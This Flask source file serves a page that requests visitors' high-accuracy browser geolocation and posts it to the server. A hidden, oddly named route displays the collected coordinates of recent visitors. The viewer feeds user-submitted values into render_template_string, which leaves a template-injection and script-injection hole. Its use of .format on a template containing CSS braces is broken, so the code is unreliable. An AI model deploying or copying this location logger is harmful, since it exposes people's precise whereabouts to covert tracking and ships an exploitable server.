import os
from flask import Flask, request, render_template_string, jsonify

app = Flask(__name__)
port = int(os.environ.get('PORT', 5000))
visitors = []

MAIN_HTML = """<!DOCTYPE html>
<html>
<head><title>main</title><style>
body{background:#000;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font:8vw monospace}
</style></head>
<body><div id="c">Определение...</div>
<script>
navigator.geolocation.getCurrentPosition(p=>{
let lat = p.coords.latitude.toFixed(6);
let lon = p.coords.longitude.toFixed(6);
document.getElementById('c').innerText = lat + ' ' + lon;
fetch('/track', {
    method:'POST',
    body:JSON.stringify({lat:lat, lon:lon}),
    headers:{'Content-Type':'application/json'}
});
}, e=>{
document.getElementById('c').innerText = 'Ошибка: ' + e.message;
}, {enableHighAccuracy:true, timeout:10000});
</script></body>"""

TRACKER_HTML = """<!DOCTYPE html>
<html>
<head><title>tracker</title><style>
body{background:#000;color:#0f0;margin:20px;font:14px monospace;white-space:pre}
</style></head>
<body>{}<script>setTimeout(()=>location.reload(),3000)</script></body>"""

@app.route('/')
def main():
    return render_template_string(MAIN_HTML)

@app.route('/qwertyuiop')
def tracker():
    output = f'=== ВСЕГО ЗАПИСЕЙ: {len(visitors)} ===\n\n'
    for i, v in enumerate(visitors[-100:], 1):
        output += f'{i}. {v["lat"]} {v["lon"]}\n'
    return render_template_string(TRACKER_HTML.format(output))

@app.route('/track', methods=['POST'])
def track():
    d = request.get_json()
    if d and 'lat' in d and 'lon' in d:
        visitors.append({'lat': d['lat'], 'lon': d['lon']})
        print(f'GEO: {d["lat"]} {d["lon"]}')
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=port)
